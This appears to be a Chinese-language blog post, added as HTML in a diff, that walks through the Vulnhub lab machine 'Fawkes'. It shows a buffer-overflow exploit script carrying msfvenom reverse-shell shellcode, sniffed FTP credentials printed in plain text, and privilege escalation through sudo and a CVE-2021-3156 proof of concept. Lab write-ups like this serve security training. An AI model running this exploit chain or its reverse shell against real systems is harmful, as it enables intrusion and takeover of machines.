@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="aesm1p">
+
+
+
+    <meta name="description" content="相逢意气为君饮">
+
+
+
+<title>Vulnhub系列-Fawkes | aesm1p&#39;s blog</title>
+
+
+
+    <link rel="icon" href="/a.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">aesm1p&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">aesm1p&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Vulnhub系列-Fawkes</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">aesm1p</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">July 26, 2021&nbsp;&nbsp;22:42:44</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/vulnhub/">vulnhub</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <img src="/2021/07/26/vulnhubFawkes/1.jpg" class="">
+
+<span id="more"></span>
+
+<p>首先进行端口扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- -sT -sV -A -oA nmap -vv 192.168.56.109</span><br></pre></td></tr></table></figure>
+
+<p>发现开放端口为</p>
+<blockquote>
+<p>21，22，80，2222，9898</p>
+</blockquote>
+<p>端口这么多开放了这么多应该挺难的，依次进行尝试：</p>
+<p><strong>21端口</strong></p>
+<p>首先试一下匿名登录，可以以ftp用户登录，得到一个server_hogwarts的二进制文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/fawkes]</span><br><span class="line">└─$ ftp 192.168.56.109</span><br><span class="line">Connected to 192.168.56.109.</span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line">Name (192.168.56.109:kali): ftp</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password:</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; dir</span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rwxr-xr-x    1 0        0          705996 Apr 12 12:04 server_hogwarts</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; get server_hogwarts</span><br></pre></td></tr></table></figure>
+
+<p>没发现其他有价值的内容，继续测试其他端口</p>
+<p><strong>80</strong></p>
+<p>进行一下目录扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 /opt/dirsearch/dirsearch.py -u http://192.168.56.109/ -w /opt/SecLists/Discovery/Web-Content/directory-list-</span><br><span class="line">2.3-medium.txt -e php,txt,html,asp -f -t 40</span><br></pre></td></tr></table></figure>
+
+<p>没有爆破得到比较有价值的目录</p>
+<p>查看刚才ftp下载的文件发现会在9898开启服务，经过测试靶机上面的9898端口就是运行的该文件，分析该文件查看是否能够进行缓冲区溢出</p>
+<p><strong>缓冲区溢出</strong></p>
+<p>查看文件类型，是一个32位x86架构的文件，查看安全机制</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/fawkes]</span><br><span class="line">└─$ checksec --file=server_hogwarts</span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified     Fortifiable      FILE</span><br><span class="line">No RELRO        Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   2250) Symbols     No    0             server_hogwarts</span><br></pre></td></tr></table></figure>
+
+<p>开启了Canary机制，栈可以执行，测试一下程序的溢出偏移量</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/fawkes]</span><br><span class="line">└─$ msf-pattern_create -l 300</span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9</span><br></pre></td></tr></table></figure>
+
+<p>然后gdb调试二进制程序并运行，输入测试payload，然后查看eip</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invalid $PC address: 0x64413764</span><br></pre></td></tr></table></figure>
+
+<p>计算偏移量</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ msf-pattern_offset -q 0x64413764</span><br><span class="line">[*] Exact match at offset 112</span><br></pre></td></tr></table></figure>
+
+<p>接下来测试偏移量是否正确</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># test.py</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(&#x27;127.0.0.1&#x27;, 9898)</span><br><span class="line">payload = b&#x27;a&#x27;*112 + b&#x27;b&#x27;*4 + b&#x27;\x90&#x27;*500</span><br><span class="line">p.recvuntil(&#x27;your spell: &#x27;)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>
+
+<p>gdb运行，可以看到eip为0x62626262</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x62626262 in ?? ()</span><br></pre></td></tr></table></figure>
+
+<p>接下来的思路就是将shellcode打到栈上，然后利用<code>jmp esp</code>指令来跳转到栈上实现执行，使用edb工具来进行调试</p>
+<p>首先attach到目标进程</p>
+<img src="/2021/07/26/vulnhubFawkes/1.png" class="">
+
+<p>然后再次发送payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python test.py</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/07/26/vulnhubFawkes/2.png" class="">
+
+<p>可以看到程序已挂掉，然后使用opcodesearcher插件搜索</p>
+<img src="/2021/07/26/vulnhubFawkes/3.png" class="">
+
+<p>使用该插件搜索jmp的地址来实现跳转</p>
+<img src="/2021/07/26/vulnhubFawkes/4.png" class="">
+
+<p>这样就知道了跳转指令的地址，接下来构建shellcode，这里需要建一个反弹shell，如果建立一个直接的shell无法回显，这里我们使用msf来生成</p>
+<img src="/2021/07/26/vulnhubFawkes/5.png" class="">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">└─$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.56.108 LPORT=8888 -b &#x27;\x00&#x27; -f py                                2 ⨯</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">Found 11 compatible encoders</span><br><span class="line">Attempting to encode payload with 1 iterations of x86/shikata_ga_nai</span><br><span class="line">x86/shikata_ga_nai succeeded with size 95 (iteration=0)</span><br><span class="line">x86/shikata_ga_nai chosen with final size 95</span><br><span class="line">Payload size: 95 bytes</span><br><span class="line">Final size of py file: 479 bytes</span><br><span class="line">buf =  b&quot;&quot;</span><br><span class="line">buf += b&quot;\xd9\xf7\xd9\x74\x24\xf4\xbb\x55\x68\xe5\xa9\x5a\x31&quot;</span><br><span class="line">buf += b&quot;\xc9\xb1\x12\x31\x5a\x17\x83\xc2\x04\x03\x0f\x7b\x07&quot;</span><br><span class="line">buf += b&quot;\x5c\x9e\xa0\x30\x7c\xb3\x15\xec\xe9\x31\x13\xf3\x5e&quot;</span><br><span class="line">buf += b&quot;\x53\xee\x74\x0d\xc2\x40\x4b\xff\x74\xe9\xcd\x06\x1c&quot;</span><br><span class="line">buf += b&quot;\x2a\x85\xc1\xb0\xc2\xd4\x31\x6a\xab\x50\xd0\xda\xad&quot;</span><br><span class="line">buf += b&quot;\x32\x42\x49\x81\xb0\xed\x8c\x28\x36\xbf\x26\xdd\x18&quot;</span><br><span class="line">buf += b&quot;\x33\xde\x49\x48\x9c\x7c\xe3\x1f\x01\xd2\xa0\x96\x27&quot;</span><br><span class="line">buf += b&quot;\x62\x4d\x64\x27&quot;</span><br></pre></td></tr></table></figure>
+
+<p>有了shellcode就可以编写exp了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(&#x27;127.0.0.1&#x27;, 9898)</span><br><span class="line">buf =  b&quot;&quot;</span><br><span class="line">buf += b&quot;\xd9\xf7\xd9\x74\x24\xf4\xbb\x55\x68\xe5\xa9\x5a\x31&quot;</span><br><span class="line">buf += b&quot;\xc9\xb1\x12\x31\x5a\x17\x83\xc2\x04\x03\x0f\x7b\x07&quot;</span><br><span class="line">buf += b&quot;\x5c\x9e\xa0\x30\x7c\xb3\x15\xec\xe9\x31\x13\xf3\x5e&quot;</span><br><span class="line">buf += b&quot;\x53\xee\x74\x0d\xc2\x40\x4b\xff\x74\xe9\xcd\x06\x1c&quot;</span><br><span class="line">buf += b&quot;\x2a\x85\xc1\xb0\xc2\xd4\x31\x6a\xab\x50\xd0\xda\xad&quot;</span><br><span class="line">buf += b&quot;\x32\x42\x49\x81\xb0\xed\x8c\x28\x36\xbf\x26\xdd\x18&quot;</span><br><span class="line">buf += b&quot;\x33\xde\x49\x48\x9c\x7c\xe3\x1f\x01\xd2\xa0\x96\x27&quot;</span><br><span class="line">buf += b&quot;\x62\x4d\x64\x27&quot;</span><br><span class="line">payload = b&#x27;a&#x27;*112 + p32(0x08049d55) + b&#x27;\x90&#x27;*500 + buf</span><br><span class="line">p.recvuntil(&#x27;your spell: &#x27;)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>
+
+<p>本地监听8888端口，然后运行exp即可得到反弹的shell，本地测试可以成功，接下来修改ip地址在靶机上进行攻击，最终脚本如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;192.168.56.109&#x27;</span>, <span class="number">9898</span>)</span><br><span class="line">buf =  <span class="string">b&quot;&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xd9\xf7\xd9\x74\x24\xf4\xbb\x55\x68\xe5\xa9\x5a\x31&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\xc9\xb1\x12\x31\x5a\x17\x83\xc2\x04\x03\x0f\x7b\x07&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x5c\x9e\xa0\x30\x7c\xb3\x15\xec\xe9\x31\x13\xf3\x5e&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x53\xee\x74\x0d\xc2\x40\x4b\xff\x74\xe9\xcd\x06\x1c&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x2a\x85\xc1\xb0\xc2\xd4\x31\x6a\xab\x50\xd0\xda\xad&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x32\x42\x49\x81\xb0\xed\x8c\x28\x36\xbf\x26\xdd\x18&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x33\xde\x49\x48\x9c\x7c\xe3\x1f\x01\xd2\xa0\x96\x27&quot;</span></span><br><span class="line">buf += <span class="string">b&quot;\x62\x4d\x64\x27&quot;</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">112</span> + p32(<span class="number">0x08049d55</span>) + <span class="string">b&#x27;\x90&#x27;</span>*<span class="number">500</span> + buf</span><br><span class="line">p.recvuntil(<span class="string">&#x27;your spell: &#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>
+
+<p>本地监听8888端口即可获得返回的shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">└─$ nc -lvvp 8888                                                                                                          1 ⨯</span><br><span class="line">listening on [any] 8888 ...</span><br><span class="line">192.168.56.109: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.56.108] from (UNKNOWN) [192.168.56.109] 41624</span><br><span class="line">id</span><br><span class="line">uid=1000(harry) gid=1000(harry) groups=1000(harry)</span><br><span class="line">uname -a</span><br><span class="line">Linux 2b1599256ca6 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64 Linux</span><br><span class="line">ifconfig</span><br><span class="line">eth0      Link encap:Ethernet  HWaddr 02:42:AC:11:00:02</span><br><span class="line">          inet addr:172.17.0.2  Bcast:172.17.255.255  Mask:255.255.0.0</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:1475 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:1956 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0</span><br><span class="line">          RX bytes:106944 (104.4 KiB)  TX bytes:295310 (288.3 KiB)</span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback</span><br></pre></td></tr></table></figure>
+
+<p>可以看到这是在容器环境下，接下来在容器中尝试提权，测试sudo发现权限很大，可以无密码执行任意命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">User harry may run the following commands on 2b1599256ca6:</span><br><span class="line">    (ALL) NOPASSWD: ALL</span><br></pre></td></tr></table></figure>
+
+<p>那么可以直接提权</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo /bin/sh</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)</span><br></pre></td></tr></table></figure>
+
+<p>在&#x2F;root目录下可以看到第一段flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /root/horcrux1.txt</span><br><span class="line">horcrux_&#123;NjogSGFSclkgUG90VGVyIGRFc1RyT3llZCBieSB2b2xEZU1vclQ=&#125;</span><br></pre></td></tr></table></figure>
+
+<p>还有一个提示文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat /root/note.txt</span><br><span class="line">Hello Admin!!</span><br><span class="line"></span><br><span class="line">We have found that someone is trying to login to our ftp server by mistake.You are requested to analyze the traffic and figure out the user.</span><br></pre></td></tr></table></figure>
+
+<p>有一个用户一直在进行ftp爆破，需要我们进行流量分析，那么进行流量抓取</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump port ftp or ftp-data</span><br></pre></td></tr></table></figure>
+
+<p>抓取到的流量中就有用户名和密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">19:58:01.408472 IP 2b1599256ca6.21 &gt; 172.17.0.1.35424: Flags [P.], seq 1:21, ack 1, win 510, options [nop,nop,TS val 3040092702 ecr 3468249378], length 20: FTP: 220 (vsFTPd 3.0.3)</span><br><span class="line">19:58:01.408556 IP 172.17.0.1.35424 &gt; 2b1599256ca6.21: Flags [.], ack 21, win 502, options [nop,nop,TS val 3468249379 ecr 3040092702], length 0</span><br><span class="line">19:58:01.408689 IP 172.17.0.1.35424 &gt; 2b1599256ca6.21: Flags [P.], seq 1:15, ack 21, win 502, options [nop,nop,TS val 3468249379 ecr 3040092702], length 14: FTP: USER neville</span><br><span class="line">19:58:01.408696 IP 2b1599256ca6.21 &gt; 172.17.0.1.35424: Flags [.], ack 15, win 510, options [nop,nop,TS val 3040092702 ecr 3468249379], length 0</span><br><span class="line">19:58:01.408752 IP 2b1599256ca6.21 &gt; 172.17.0.1.35424: Flags [P.], seq 21:55, ack 15, win 510, options [nop,nop,TS val 3040092702 ecr 3468249379], length 34: FTP: 331 Please specify the password.</span><br><span class="line">19:58:01.408860 IP 172.17.0.1.35424 &gt; 2b1599256ca6.21: Flags [P.], seq 15:30, ack 55, win 502, options [nop,nop,TS val 3468249379 ecr 3040092702], length 15: FTP: PASS bL!Bsg3k</span><br></pre></td></tr></table></figure>
+
+<p>使用获得的用户名和密码ssh登录<code>neville:bL!Bsg3k</code></p>
+<p>登录之后可以获取到第二个flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">neville@Fawkes:~$ cat horcrux2.txt</span><br><span class="line">horcrux_&#123;NzogTmFHaU5pIHRIZSBTbkFrZSBkZVN0cm9ZZWQgQnkgTmVWaWxsZSBMb25HYm9UVG9t&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在靶机环境上也安装了sudo，正好有最新的sudo的cve漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">neville@Fawkes:~$ sudo --version</span><br><span class="line">Sudo version 1.8.27</span><br><span class="line">Sudoers policy plugin version 1.8.27</span><br><span class="line">Sudoers file grammar version 46</span><br><span class="line">Sudoers I/O plugin version 1.8.27</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/07/26/vulnhubFawkes/6.png" class="">
+
+<p>不过这个很多POC都无法利用，最后经过搜索资料，发现<a target="_blank" rel="noopener" href="https://github.com/0xdevil/CVE-2021-3156">这个</a>POC比较好用</p>
+<p>上传到主机上，直接make编译，但是运行会无法提权，查看该项目的issue发现前辈的脚印</p>
+<img src="/2021/07/26/vulnhubFawkes/7.png" class="">
+
+<p>POC作者热心地给出了解答，这是因为该靶机上的sudo命令的默认位置与poc不一致有关，算是一个小坑，我们修改一下poc的sudo的路径即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">neville@Fawkes:~$ which sudo</span><br><span class="line">/usr/local/bin/sudo</span><br></pre></td></tr></table></figure>
+
+<p>将exploitc.c的sudo地址修改为上述地址</p>
+<img src="/2021/07/26/vulnhubFawkes/8.png" class="">
+
+<p>再次进行编译运行即可提权</p>
+<img src="/2021/07/26/vulnhubFawkes/9.png" class="">
+
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>这个靶机还是很有价值的，考察到的知识点很全面，也对知识要求很高，是很不错的一台靶机</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>aesm1p</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://example.com/2021/07/26/vulnhubFawkes/">http://example.com/2021/07/26/vulnhubFawkes/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2022 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/PWN/"># PWN</a>
+                    
+                        <a href="/tags/CVE-2021-3156/"># CVE-2021-3156</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2021/07/27/vulnhubHotelWW/">Vulnhub系列-Worst Western Hotel</a>
+            
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© aesm1p | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
